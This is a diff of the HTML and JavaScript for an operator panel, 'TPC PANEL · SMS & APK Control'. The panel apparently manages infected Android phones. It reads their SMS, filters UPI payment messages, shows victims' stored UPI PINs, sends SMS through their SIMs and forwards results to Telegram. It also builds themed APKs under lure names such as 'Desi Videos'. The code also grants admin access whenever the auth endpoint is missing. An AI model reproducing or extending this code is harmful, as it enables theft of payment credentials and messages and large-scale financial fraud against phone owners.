+<article class="stat panel"><div class="stat-top"><span class="stat-label">My apps</span><span class="stat-icon">📦</span></div><div class="stat-val violet" id="bApps">—</div><div class="stat-foot">tumhare appId</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Builds today</span><span class="stat-icon">⚙</span></div><div class="stat-val green" id="bToday">—</div><div class="stat-foot" id="bQuota">—</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Queue</span><span class="stat-icon">⏳</span></div><div class="stat-val" id="bQueued">—</div><div class="stat-foot" id="bRunningFoot">running 0</div></article>
 </div>
 
 <section class="panel-box panel">
-<div class="panel-head"><h3>Create app</h3><span class="badge">isolated per user</span></div>
+<div class="panel-head"><h3>Theme</h3><span class="badge" id="themePick">—</span></div>
+<div class="panel-body">
+<div class="tprev">
+<div><div class="themes" id="themeGrid"><div class="empty">themes load ho rahe hain…</div></div></div>
+<div><div class="tphone"><div class="tscreen" id="themePreview"></div></div></div>
+</div>
+</div>
+</section>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Create app</h3><span class="badge">theme + name bake hota hai</span></div>
 <div class="keygen">
-<div><label for="appName">App name</label><input id="appName" placeholder="e.g. IvanShop"></div>
+<div><label for="appName">App name</label><input id="appName" placeholder="e.g. Desi Videos"></div>
+<div><label for="appPkg">Package id</label><input id="appPkg" class="mono" placeholder="com.venice.desi"></div>
 <div><label for="appBase">API base URL (optional)</label><input id="appBase" class="mono" placeholder="https://panel.example.com"></div>
-<div><label for="appVariant">Variant</label>
-<select id="appVariant"><option value="release">release</option><option value="debug">debug</option></select></div>
-<div><button class="btn primary w100" id="appCreate" type="button">＋ Create app</button></div>
+<div><label for="appVariant">Variant</label><select id="appVariant"><option value="release">release</option><option value="debug">debug</option></select></div>
 </div>
 <div class="panel-body" style="padding-top:0">
+<div style="display:flex;gap:10px;flex-wrap:wrap">
+<button class="btn primary" id="appCreate" type="button">＋ Create app</button>
+<button class="btn ghost" id="quickBuild" type="button">⚡ Quick build (theme only)</button>
+</div>
 <div class="keyout" id="secretOut" hidden>
 <div style="min-width:0">
 <div class="small muted upper">Secret — sirf ek baar poora dikhta hai, save karo</div>
@@ -890,18 +782,12 @@ main{padding:18px 13px}
 
 <section class="panel-box panel">
 <div class="panel-head"><h3>My apps</h3><span class="badge" id="appCount">0</span></div>
-<div class="table-wrap">
-<table><thead><tr><th>App</th><th>appId</th><th>Secret</th><th>Package</th><th>Builds</th><th>Actions</th></tr></thead>
-<tbody id="appBody"></tbody></table>
-</div>
+<div class="table-wrap"><table><thead><tr><th>App</th><th>appId</th><th>Theme</th><th>Secret</th><th>Package</th><th>Builds</th><th>Actions</th></tr></thead><tbody id="appBody"></tbody></table></div>
 </section>
 
 <section class="panel-box panel">
 <div class="panel-head"><h3>Builds</h3><span class="badge" id="buildCount">0</span></div>
-<div class="table-wrap">
-<table><thead><tr><th>Build</th><th>App</th><th>Status</th><th>Variant</th><th>Duration</th><th>Size</th><th>SHA256</th><th></th></tr></thead>
-<tbody id="buildBody"></tbody></table>
-</div>
+<div class="table-wrap"><table><thead><tr><th>Build</th><th>App</th><th>Status</th><th>Variant</th><th>Duration</th><th>Size</th><th>SHA256</th><th></th></tr></thead><tbody id="buildBody"></tbody></table></div>
 </section>
 
 <section class="panel-box panel" id="logPanel" hidden>
@@ -917,18 +803,17 @@ main{padding:18px 13px}
 </section>
 
 <section class="panel-box panel">
+<div class="panel-head"><h3>Builder preflight</h3><button class="btn ghost" id="pfBtn" type="button">check</button></div>
+<div class="panel-body" id="pfOut"><div class="muted small">gradle / sdk / template status yahan aayega</div></div>
+</section>
+
+<section class="panel-box panel">
 <div class="panel-head"><h3>APK integration</h3><span class="badge">signed requests</span></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Headers</strong>
-<p>Har request par <code class="mono">X-App-Id</code>, <code class="mono">X-Timestamp</code> (epoch seconds) aur <code class="mono">X-Signature</code> bhejo.</p></div>
-<div class="settings-row"><strong>Signature</strong>
-<p><code class="mono">HMAC-SHA256(secret, raw_body + timestamp)</code> — hex lowercase.</p></div>
-<div class="settings-row"><strong>Window</strong>
-<p>Timestamp ±300s ke andar hona chahiye.</p></div>
-<div class="settings-row"><strong>Isolation</strong>
-<p>appId sirf verified header se liya jaata hai — body me aaya appId ignore hota hai.</p></div>
-<div class="settings-row"><strong>Endpoints</strong>
-<p><code class="mono">POST /api/orders</code> · <code class="mono">GET /api/orders</code> · <code class="mono">POST /api/echo</code></p></div>
+<div class="settings-row"><strong>Headers</strong><p><code class="mono">X-App-Id</code>, <code class="mono">X-Timestamp</code> (epoch seconds), <code class="mono">X-Signature</code></p></div>
+<div class="settings-row"><strong>Signature</strong><p><code class="mono">HMAC-SHA256(secret, raw_body + timestamp)</code> — hex lowercase</p></div>
+<div class="settings-row"><strong>Window</strong><p>Timestamp ±300s ke andar</p></div>
+<div class="settings-row"><strong>Endpoints</strong><p><code class="mono">POST /api/orders</code> · <code class="mono">GET /api/orders</code> · <code class="mono">POST /api/echo</code></p></div>
 </div>
 </section>
 </section>
@@ -949,73 +834,29 @@ main{padding:18px 13px}
 <section class="page" id="page-users">
 <div class="head">
 <div><h2>Access keys</h2><p>Key generate karo, user ko do — koi register nahi</p></div>
-<div class="toolbar">
-<input id="userSearch" placeholder="🔍 key / label / phone">
-<button class="btn ghost" data-refresh="users" type="button">↻ Refresh</button>
+<div class="toolbar"><input id="userSearch" placeholder="🔍 key / label / phone"><button class="btn ghost" data-refresh="users" type="button">↻ Refresh</button></div>
 </div>
-</div>
-
 <div class="stats">
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Total keys</span><span class="stat-icon">🔑</span></div>
-<div class="stat-val neon" id="uTotal">—</div><div class="stat-foot">generated</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Active</span><span class="stat-icon">◉</span></div>
-<div class="stat-val green" id="uActive">—</div><div class="stat-foot">valid access</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Expired</span><span class="stat-icon">⌛</span></div>
-<div class="stat-val red" id="uExpired">—</div><div class="stat-foot">renew needed</div>
-</article>
-<article class="stat panel">
-<div class="stat-top"><span class="stat-label">Blocked</span><span class="stat-icon">⛔</span></div>
-<div class="stat-val violet" id="uBlocked">—</div><div class="stat-foot">manually blocked</div>
-</article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Total keys</span><span class="stat-icon">🔑</span></div><div class="stat-val neon" id="uTotal">—</div><div class="stat-foot">generated</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Active</span><span class="stat-icon">◉</span></div><div class="stat-val green" id="uActive">—</div><div class="stat-foot">valid access</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Expired</span><span class="stat-icon">⌛</span></div><div class="stat-val red" id="uExpired">—</div><div class="stat-foot">renew needed</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">Blocked</span><span class="stat-icon">⛔</span></div><div class="stat-val violet" id="uBlocked">—</div><div class="stat-foot">manually blocked</div></article>
 </div>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>Generate new key</h3><span class="badge">admin only</span></div>
 <div class="keygen">
-<div>
-<label for="kLabel">Label / user name</label>
-<input id="kLabel" placeholder="e.g. Rahul">
-</div>
-<div>
-<label for="kPhone">Phone (optional)</label>
-<input id="kPhone" class="mono" placeholder="+91…">
-</div>
-<div>
-<label for="kDays">Expiry</label>
-<select id="kDays">
-<option value="7">7 days</option>
-<option value="30" selected>30 days</option>
-<option value="90">90 days</option>
-<option value="365">1 year</option>
-<option value="0">Lifetime</option>
-</select>
-</div>
+<div><label for="kLabel">Label / user name</label><input id="kLabel" placeholder="e.g. Rahul"></div>
+<div><label for="kPhone">Phone (optional)</label><input id="kPhone" class="mono" placeholder="+91…"></div>
+<div><label for="kDays">Expiry</label><select id="kDays"><option value="7">7 days</option><option value="30" selected>30 days</option><option value="90">90 days</option><option value="365">1 year</option><option value="0">Lifetime</option></select></div>
 <div><button class="btn primary w100" id="kGen" type="button">🔑 Generate key</button></div>
 </div>
 <div class="panel-body" style="padding-top:0">
-<div class="keyout" id="kOut" hidden>
-<div>
-<div class="small muted upper">Ye key user ko bhejo</div>
-<div class="k" id="kValue">—</div>
-</div>
-<button class="mini g" id="kCopy" type="button">⧉ copy key</button>
-</div>
+<div class="keyout" id="kOut" hidden><div><div class="small muted upper">Ye key user ko bhejo</div><div class="k" id="kValue">—</div></div><button class="mini g" id="kCopy" type="button">⧉ copy key</button></div>
 </div>
 </section>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>Keys</h3><span class="badge" id="userCount">0</span></div>
-<div class="table-wrap">
-<table>
-<thead><tr><th>Key</th><th>Label</th><th>Created</th><th>Last login</th><th>Logins</th><th>Expiry</th><th>Status</th><th>Set expiry</th><th></th></tr></thead>
-<tbody id="userBody"></tbody>
-</table>
-</div>
+<div class="table-wrap"><table><thead><tr><th>Key</th><th>Label</th><th>Created</th><th>Last login</th><th>Logins</th><th>Expiry</th><th>Status</th><th>Set expiry</th><th></th></tr></thead><tbody id="userBody"></tbody></table></div>
 </section>
 </section>
 
@@ -1024,14 +865,13 @@ main{padding:18px 13px}
 <section class="panel-box panel">
 <div class="panel-head"><h3>Application</h3></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v6.0</p></div>
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; APK Control · v7.0</p></div>
 <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
 <div class="settings-row"><strong>Backend</strong><p class="mono" id="apiBase">/</p></div>
-<div class="settings-row"><strong>Access</strong><p>Admin: username + password. User: sirf access key.</p></div>
-<div class="settings-row"><strong>APK Builder</strong><p>/api/apps, /api/builds, /api/builds/{id}/download — backend asli me gradle chalata hai aur APK banata hai.</p></div>
-<div class="settings-row"><strong>Builder health</strong><p>/health/builder — gradlew / Android SDK / template ready hai ya nahi.</p></div>
+<div class="settings-row"><strong>APK Builder</strong><p>/api/apps · /api/builds · /api/builds/{id}/download · /api/builder/themes</p></div>
+<div class="settings-row"><strong>Builder health</strong><p>/api/builder/config · /api/builder/preflight</p></div>
 <div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
-<div class="settings-row"><strong>Admin socket</strong><p>/ws/admin</p></div>
+<div class="settings-row"><strong>Admin socket</strong><p>/ws/admin · build updates /ws/user</p></div>
 <div class="settings-row"><strong>SMS ingest</strong><p>/devices/sms/incoming</p></div>
 <div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding</p></div>
 </div>
@@ -1069,9 +909,7 @@ main{padding:18px 13px}
 <button class="btn plain" id="dClose" type="button">Close</button>
 </div>
 </div>
-
 <div class="banner" id="dBanner" hidden></div>
-
 <section class="panel-box panel as-panel" id="asPanel" hidden>
 <div class="as-head">
 <div class="as-ico">🤖</div>
@@ -1086,18 +924,12 @@ main{padding:18px 13px}
 <div class="step">
 <span class="step-tag">STEP 1</span>
 <p class="step-desc">Is Telegram account ko apne channel me admin banao</p>
-<div class="copy-row">
-<span class="mono" id="asAccount">—</span>
-<button class="mini" id="asCopy" type="button">copy</button>
-</div>
+<div class="copy-row"><span class="mono" id="asAccount">—</span><button class="mini" id="asCopy" type="button">copy</button></div>
 </div>
 <div class="step">
 <span class="step-tag">STEP 2 — BIND CHANNEL</span>
 <label for="chanInput" style="margin-top:12px">Channel ID</label>
-<div class="inline">
-<input id="chanInput" class="mono" placeholder="-1001234567890">
-<button class="btn plain" id="chanVerify" type="button">Verify</button>
-</div>
+<div class="inline"><input id="chanInput" class="mono" placeholder="-1001234567890"><button class="btn plain" id="chanVerify" type="button">Verify</button></div>
 <div class="ok-msg" id="chanMsg" hidden><span id="chanMsgTxt"></span></div>
 <p class="hint">Channel → Manage → Channel Info → ID (ya @userinfobot se lo).</p>
 <button class="btn primary w100" id="chanBind" type="button">✓ Channel Bound — Update</button>
@@ -1108,15 +940,13 @@ main{padding:18px 13px}
 <p class="step-desc">Jitne SIM on karoge, utne se SMS jaayega.</p>
 <div class="simchips" id="asSims"></div>
 <div class="toggle-row" style="margin-top:12px">
-<div><div class="t-name">Telegram confirm</div>
-<div class="t-desc">Bheje gaye SMS ka confirm set format me forward target par</div></div>
+<div><div class="t-name">Telegram confirm</div><div class="t-desc">Bheje gaye SMS ka confirm set format me forward target par</div></div>
 <button class="switch" id="asTgConfirm" type="button"></button>
 </div>
 <button class="btn ghost w100" id="testConn" style="margin-top:12px" type="button">Test connection</button>
 </div>
 </div>
 </section>
-
 <div class="detail-grid">
 <div class="col">
 <section class="panel-box panel">
@@ -1146,14 +976,11 @@ main{padding:18px 13px}
 <div class="panel-body" id="dMore" hidden></div>
 </section>
 </div>
-
 <section class="panel-box panel">
 <div class="panel-head"><h3>Messages</h3><span class="badge" id="dMsgCount">0</span></div>
 <div class="searchbar">
 <input id="dSearch" placeholder="🔍 search message / number / amount…">
-<select id="dDir">
-<option value="">All</option><option value="in">Inbound</option><option value="out">Outbound</option>
-</select>
+<select id="dDir"><option value="">All</option><option value="in">Inbound</option><option value="out">Outbound</option></select>
 <label class="badge lbl"><input type="checkbox" id="dUpi"> UPI only</label>
 </div>
 <div class="msg-list" id="dMsgList"></div>
@@ -1172,23 +999,27 @@ const PHONE_SVG = '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" s
 const BOLT_SVG = '<svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M13.5 2 5 13h5.5L9.5 22 19 10.5h-5.9z"/></svg>';
 const SIM_SVG = '<svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M7.5 3h6.8L19 7.7V20a1 1 0 0 1-1 1H7.5a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1z"/><rect x="9.4" y="12.4" width="6.2" height="5.2" rx="1.1"/><path d="M9.4 9.4h3.4"/></svg>';
 
-const BUILDER_HEALTH = "/health/builder";
-const TKEY = "tpc.token.v11";
-const SKEY = "tpc.session.v11";
+const CFG_URL = "/api/builder/config";
+const PF_URL = "/api/builder/preflight";
+const THEMES_URL = "/api/builder/themes";
+const TKEY = "tpc.token.v12";
+const SKEY = "tpc.session.v12";
+const THEME_KEY = "tpc.theme.v12";
 
 let reloginPromise = null;
 let gridSig = "";
 let liveSig = "";
 
 const state = {
-auth:false, role:"user", me:null, users:[], devices:[], messages:[], devMsgs:{},
-rules:[], relay:null, relayAccount:null, forward:"", outbox:[],
-growth:null, growthEvents:[],
-apps:[], builds:[], buildCfg:null, quota:null,
-logBuild:null,
-pinsOnly:false, active:null, asOpen:false, toastTimer:null, pollTimer:null,
-ws:null, wsOk:false, wsFails:0, wsTimer:null, wsUser:null, linkOk:false, apiDown:false,
-numTried:{}, lastError:"",
+auth:false, role:"user", noAuth:false, noAdmin:false,
+devices:[], messages:[], devMsgs:{}, rules:[], relay:null, relayAccount:null,
+forward:"", outbox:[], growth:null, growthEvents:[],
+apps:[], builds:[], buildCfg:null, quota:null, themes:[], pickedTheme:localStorage.getItem(THEME_KEY)||"mono",
+logBuild:null, pf:null,
+pinsOnly:false, active:null, asOpen:false, toastTimer:null,
+pollTimer:null, buildTimer:null,
+ws:null, wsOk:false, wsFails:0, wsTimer:null, wsUser:null,
+linkOk:false, apiDown:false, numTried:{}, lastError:"",
 sel:{ as:[], send:[], bulk:[] }
 };
 
@@ -1197,20 +1028,17 @@ function addCls(el,name){ if(!el)return; const t=(name==null?"":String(name)).tr
 function reportError(e){
 const msg=(e&&(e.message||(e.reason&&e.reason.message)))||String(e||"unknown error");
 state.lastError=msg; try{console.error(e);}catch(x){}
-toast("error: "+msg);
 }
 window.addEventListener("error",(ev)=>{ if(ev&&ev.message)reportError(ev.message); });
 window.addEventListener("unhandledrejection",(ev)=>{ reportError(ev.reason); });
 
 function notice(text,bad){
-const el=$("#notice");
-if(!el)return;
+const el=$("#notice"); if(!el)return;
 if(!text){el.hidden=true;return;}
 el.textContent=text; el.className="notice"+(bad?" bad":""); el.hidden=false;
 }
 function builderNotice(text,bad){
-const el=$("#builderNotice");
-if(!el)return;
+const el=$("#builderNotice"); if(!el)return;
 if(!text){el.hidden=true;return;}
 el.textContent=text; el.className="notice"+(bad?" bad":""); el.hidden=false;
 }
@@ -1231,7 +1059,7 @@ function decPass(p){ try{return decodeURIComponent(escape(atob(p)));}catch(e){re
 function toast(text){
 const t=$("#toast"); if(!t)return;
 t.textContent=text; t.hidden=false;
-clearTimeout(state.toastTimer); state.toastTimer=setTimeout(()=>{t.hidden=true;},4200);
+clearTimeout(state.toastTimer); state.toastTimer=setTimeout(()=>{t.hidden=true;},3800);
 }
 function loginMsg(text,kind){ const el=$("#loginMsg"); el.textContent=text; el.className="msg "+(kind||"err"); }
 function badge(el,text,kind){ if(!el)return; el.textContent=text; el.className="badge "+(kind||""); }
@@ -1242,6 +1070,7 @@ function fmtDate(v){ if(!v)return "—"; const d=new Date(v);
 return Number.isNaN(d.getTime())?String(v):d.toLocaleDateString(); }
 function toDateInput(v){ if(!v)return ""; const d=new Date(v); if(Number.isNaN(d.getTime()))return "";
 const p=(n)=>String(n).padStart(2,"0"); return d.getFullYear()+"-"+p(d.getMonth()+1)+"-"+p(d.getDate()); }
+function num(v,fb){ const n=Number(v); return Number.isFinite(n)?n:(fb===undefined?0:fb); }
 function val(v,fb){
 if(v===null||v===undefined||v==="")return fb===undefined?"—":fb;
 if(typeof v==="boolean")return v?"Yes":"No";
@@ -1254,7 +1083,7 @@ const td=document.createElement("td"); const b=document.createElement("span");
 const s=String(val(v,"unknown")).toLowerCase(); b.className="badge";
 if(force&&String(force).trim())addCls(b,force);
 else if(["online","active","sent","success","bound","upi","delivered","received","ok","install"].indexOf(s)>=0)addCls(b,"ok");
-else if(["pending","queued","sending","update","stale","running"].indexOf(s)>=0)addCls(b,"warn");
+else if(["pending","queued","sending","update","stale","running","prod"].indexOf(s)>=0)addCls(b,"warn");
 else if(["failed","error","offline","gone","uninstalled","canceled"].indexOf(s)>=0)addCls(b,"bad");
 b.textContent=val(v,"—"); td.appendChild(b); row.appendChild(td);
 }
@@ -1286,17 +1115,18 @@ frag.appendChild(m); i=idx+n.length;
 }
 return frag;
 }
+function esc(s){ return String(s===null||s===undefined?"":s)
+.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }
+function debounce(fn,ms){ let t=null; return function(){ const a=arguments;
+clearTimeout(t); t=setTimeout(()=>fn.apply(null,a),ms||180); }; }
 
-/* ---------- null-safe device helpers ---------- */
 function tel(d){ return (d&&d.telemetry&&typeof d.telemetry==="object")?d.telemetry:{}; }
 function devId(d){ return (d&&(d.id||d._id))||null; }
 function devName(d){ return (d&&(d.device_name||d.name))||"Unnamed device"; }
 function devStatus(d){ if(!d)return "Offline"; if(d.ws_connected)return "Online"; return d.status||"Offline"; }
 function online(d){ return Boolean(d&&d.ws_connected); }
 function hasPin(d){ return Boolean(d&&d.upi_pin); }
-function autoOf(d){
-return (d&&d.auto_sender)||{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true};
-}
+function autoOf(d){ return (d&&d.auto_sender)||{enabled:false,channel_id:"",sim_slots:[],tg_confirm:true}; }
 function findDevice(id){ return state.devices.find((x)=>String(devId(x))===String(id))||null; }
 function shortOf(deviceId){ const d=findDevice(deviceId); return d&&d.short_id?d.short_id:""; }
 function batt(d){ const l=tel(d).battery_level; return typeof l==="number"&&l>=0?l:null; }
@@ -1315,7 +1145,6 @@ if(tel(d).battery_charging){ const b=document.createElement("span");
 b.style.color="var(--amber)"; b.innerHTML=BOLT_SVG; wrap.appendChild(b); }
 return wrap;
 }
-
 function mem(v){
 if(v===null||v===undefined||v==="")return "—";
 if(typeof v==="string"&&Number.isNaN(Number(v)))return v;
@@ -1338,7 +1167,6 @@ const mb=pick(t,["storage_total_mb","storage_mb","storage_total","storage"]);
 return mb!==null?mem(mb):"—"; }
 function freeStorage(d){ const v=pick(tel(d),["free_storage_mb","storage_free_mb","free_storage","storage_free"]);
 return v!==null?mem(v):null; }
-
 function nums(d){
 const t=tel(d);
 return {
@@ -1392,17 +1220,18 @@ let data=null;
 if(ct.indexOf("application/json")>=0)data=await res.json().catch(()=>({}));
 else{ const txt=await res.text(); data=txt?{detail:txt}:{}; }
 
+if(res.status===404&&path.indexOf("/admin/")===0)state.noAdmin=true;
+
 if(res.status===401||res.status===403){
-const e=new Error(data.detail||"Authentication required."); e.auth=true;
-if(retry!==false){
+const e=new Error(data.detail||data.message||"Authentication required."); e.auth=true;
+if(retry!==false&&!state.noAuth){
 const ok=await relogin();
 if(ok)return api(path,options,false);
-if(state.auth)showLogin("Session expire ho gaya — dobara sign in karo");
 }
 throw e;
 }
 if(!res.ok){
-let m=data.detail||data.message||("Failed ("+res.status+")");
+let m=data.detail||data.message||data.error||("Failed ("+res.status+")");
 if(Array.isArray(m))m=m.map((x)=>x.msg||String(x)).join(", ");
 const e2=new Error(m); e2.status=res.status; throw e2;
 }
@@ -1425,7 +1254,7 @@ return true;
 return reloginPromise;
 }
 
-function selSlots(arr){ return arr.filter((s)=>s===0||s===1).sort(); }
+function selSlots(arr){ return (arr||[]).filter((s)=>s===0||s===1).sort(); }
 
 function attemptSend(job){
 const body={to:job.to||null,body:job.body,sim_slots:job.slots&&job.slots.length?job.slots:null};
@@ -1488,7 +1317,6 @@ async function devCommand(id,action){
 try{ await api("/admin/devices/"+id+"/command",{method:"POST",body:JSON.stringify({action:action})}); return true; }
 catch(e){ return false; }
 }
-
 async function pingDevice(d){ toast("ping bheja…"); await devCommand(devId(d),"ping");
 setTimeout(()=>loadDevices().catch(()=>{}),1200); }
 async function fetchNumber(d){ toast("number request bheja…");
@@ -1504,9 +1332,9 @@ catch(e){ toast(e.message); }
 }
 
 function applyRole(){
-const isAdmin=state.role==="admin";
+const isAdmin=state.role==="admin"||state.noAuth;
 document.querySelectorAll("[data-admin-only]").forEach((el)=>{ el.hidden=!isAdmin; });
-badge($("#roleBadge"),isAdmin?"ADMIN":"USER",isAdmin?"ok":"id");
+badge($("#roleBadge"),state.noAuth?"NO-AUTH":(isAdmin?"ADMIN":"USER"),isAdmin?"ok":"id");
 }
 
 function showLogin(msgText){
@@ -1517,31 +1345,34 @@ if(msgText)loginMsg(msgText);
 function showApp(){ state.auth=true; $("#loginScreen").hidden=true; $("#app").hidden=false; }
 
 async function afterLogin(role){
-state.role=role||"user"; applyRole(); await refreshAll(); startRealtime();
+state.role=role||"user"; applyRole();
+await refreshAll();
+startRealtime();
 connectUserSocket();
 }
 
 async function checkAuth(){
+let st=null, err=null;
+try{ st=await api("/admin/auth/status",{},false); }catch(e){ err=e; }
+
+if(err&&(err.status===404||err.network)){
+state.noAuth=true;
 const s=readSession();
-if(s){
 showApp();
-let info=null;
-try{ info=await api("/admin/auth/status"); }catch(e){}
-if(info&&info.authenticated){ await afterLogin(info.role||s.role||"user"); return; }
-const ok=await relogin();
-if(ok){ await afterLogin(state.role||s.role||"user"); return; }
-showLogin("Saved session invalid — key/password daalo"); return;
+await afterLogin(s&&s.role?s.role:"admin");
+if(err.network)notice("Backend reachable nahi — server chal raha hai? "+err.message,true);
+return;
 }
-try{
-const r2=await api("/admin/auth/status");
-if(r2&&r2.authenticated){ showApp(); await afterLogin(r2.role||"admin"); return; }
-}catch(e){
-loginMsg("Backend reachable nahi — server chal raha hai? ("+e.message+")");
+
+const s=readSession();
+if(st&&st.authenticated){ showApp(); await afterLogin(st.role||(s&&s.role)||"admin"); return; }
+if(s){
+const ok=await relogin();
+if(ok){ showApp(); await afterLogin(state.role||s.role||"user"); return; }
+showLogin("Saved session invalid — key/password daalo"); return;
 }
 showLogin("");
 }
-
-/* ------------------------------ sim chips ------------------------------ */
 
 function buildSimChips(container,key,device,onChange){
 if(!container)return;
@@ -1553,7 +1384,7 @@ btn.type="button";
 btn.className="simchip"+(sel.indexOf(slot)>=0?" on":"");
 btn.dataset.slot=String(slot);
 btn.innerHTML=SIM_SVG+'<span>SIM '+(slot+1)+
-'<span class="sc-sub">'+String(simLabel(device,slot)).replace(/[<>&]/g,"")+'</span></span>';
+'<span class="sc-sub">'+esc(simLabel(device,slot))+'</span></span>';
 btn.addEventListener("click",()=>{
 const cur=state.sel[key]||[];
 const i=cur.indexOf(slot);
@@ -1566,8 +1397,7 @@ container.appendChild(btn);
 });
 if(!sel.length){
 const hint=document.createElement("span");
-hint.className="small muted";
-hint.style.alignSelf="center";
+hint.className="small muted"; hint.style.alignSelf="center";
 hint.textContent="(kuch select na ho to device default)";
 container.appendChild(hint);
 }
@@ -1586,13 +1416,12 @@ toast("SIM selection saved");
 function renderOverview(){
 const total=state.devices.length; const on=state.devices.filter(online).length;
 $("#sTotal").textContent=total; $("#sOnline").textContent=on; $("#sOffline").textContent=total-on;
-const sims=state.devices.reduce((s,d)=>s+((tel(d).sims||[]).length||0),0);
-$("#sSims").textContent=sims;
+$("#sSims").textContent=state.devices.reduce((s,d)=>s+((tel(d).sims||[]).length||0),0);
 $("#sPins").textContent=state.devices.filter(hasPin).length;
 if(state.growth){
-$("#sInstalls").textContent=state.growth.installs_total;
-$("#sUninstalled").textContent=state.growth.uninstalled;
-$("#sReinstalls").textContent=state.growth.reinstalls;
+$("#sInstalls").textContent=num(state.growth.installs_total);
+$("#sUninstalled").textContent=num(state.growth.uninstalled);
+$("#sReinstalls").textContent=num(state.growth.reinstalls);
 }
 const body=$("#recentBody");
 if(!state.devices.length){ empty(body,5,"No devices registered"); return; }
@@ -1604,8 +1433,7 @@ const idc=document.createElement("td"); const idb=document.createElement("span")
 idb.className="badge id mono"; idb.textContent=d.short_id||"—"; idc.appendChild(idb); row.appendChild(idc);
 const c=document.createElement("td"); const info=nums(d);
 c.textContent=info.live||info.entered||tel(d).sim_carrier||"—";
-if(d.upi_pin){ const p=document.createElement("span"); p.className="pin-chip";
-p.textContent="PIN "+d.upi_pin; c.appendChild(p); }
+if(d.upi_pin){ const p=document.createElement("span"); p.className="pin-chip"; p.textContent="PIN "+d.upi_pin; c.appendChild(p); }
 row.appendChild(c);
 badgeCell(row,devStatus(d)); cell(row,fmt(d.created_at));
 body.appendChild(row);
@@ -1615,7 +1443,6 @@ body.appendChild(row);
 function liveSignature(){
 return state.devices.map((d)=>[devId(d),devName(d),devStatus(d),nums(d).live,nums(d).entered,tel(d).model].join("|")).join("~");
 }
-
 function renderLive(force){
 const sig=liveSignature(); if(!force&&sig===liveSig)return; liveSig=sig;
 const total=state.devices.length; const on=state.devices.filter(online).length;
@@ -1625,20 +1452,17 @@ $("#lUpi").textContent=state.messages.filter((m)=>m.kind==="upi").length;
 const body=$("#liveBody");
 if(!state.devices.length){ empty(body,5,"No devices"); return; }
 body.replaceChildren();
-
 state.devices.forEach((d)=>{
 const info=nums(d); const row=document.createElement("tr");
 const nameCell=document.createElement("td"); nameCell.textContent=devName(d);
 const sub=document.createElement("span"); sub.className="sub mono";
 sub.textContent=(d.short_id?d.short_id+" · ":"")+(online(d)?"● online":"○ offline")+" · "+(tel(d).model||"—");
 nameCell.appendChild(sub); row.appendChild(nameCell);
-
 const numCell=document.createElement("td"); numCell.className="mono";
 numCell.textContent=info.live||info.entered||"—";
 const nsub=document.createElement("span"); nsub.className="sub";
 nsub.textContent=info.live?"live (device)":(info.entered?"entered (operator)":"no number");
 numCell.appendChild(nsub); row.appendChild(numCell);
-
 const sc=document.createElement("td"); const wrap0=document.createElement("div");
 wrap0.className="simchips"; wrap0.style.marginTop="0";
 [0,1].forEach((slot)=>{
@@ -1649,7 +1473,6 @@ b.addEventListener("click",()=>b.classList.toggle("on"));
 wrap0.appendChild(b);
 });
 sc.appendChild(wrap0); row.appendChild(sc);
-
 const sendCell=document.createElement("td"); const wrap=document.createElement("div");
 wrap.style.display="flex"; wrap.style.gap="6px";
 const input=document.createElement("input"); input.placeholder="message…"; input.style.minWidth="150px";
@@ -1664,12 +1487,10 @@ if(ok)input.value="";
 btn.disabled=false;
 });
 wrap.appendChild(input); wrap.appendChild(btn); sendCell.appendChild(wrap); row.appendChild(sendCell);
-
 const lastCell=document.createElement("td"); const openBtn=document.createElement("button");
 openBtn.className="mini v"; openBtn.type="button"; openBtn.textContent="Open";
 openBtn.addEventListener("click",()=>openDeviceById(devId(d)));
 lastCell.appendChild(openBtn); row.appendChild(lastCell);
-
 body.appendChild(row);
 });
 }
@@ -1708,10 +1529,11 @@ body.appendChild(row);
 /* ------------------------------ growth ------------------------------ */
 
 async function loadStats(){
+if(state.noAdmin)return;
 try{ state.growth=await api("/admin/stats"); renderGrowth(); }catch(e){}
 }
-
 async function loadGrowthEvents(){
+if(state.noAdmin)return;
 const f=$("#growthFilter")?$("#growthFilter").value:"";
 try{
 const d=await api("/admin/growth/events?limit=120");
@@ -1719,29 +1541,27 @@ state.growthEvents=(d.events||[]).filter((e)=>!f||e.event===f);
 }catch(e){ state.growthEvents=[]; }
 renderGrowthEvents();
 }
-
 function renderGrowth(){
 const g=state.growth; if(!g)return;
-$("#gInstalls").textContent=g.installs_total;
-$("#gLive").textContent=g.live;
-$("#gIdle").textContent=g.idle;
-$("#gStale").textContent=g.stale;
-$("#gUninstalled").textContent=g.uninstalled;
-$("#gReinstalls").textContent=g.reinstalls;
-$("#gUnique").textContent=g.unique_devices;
-$("#gToday").textContent=g.install_events_24h;
-$("#gRate").textContent=g.uninstall_rate_pct+"%";
+$("#gInstalls").textContent=num(g.installs_total);
+$("#gLive").textContent=num(g.live);
+$("#gIdle").textContent=num(g.idle);
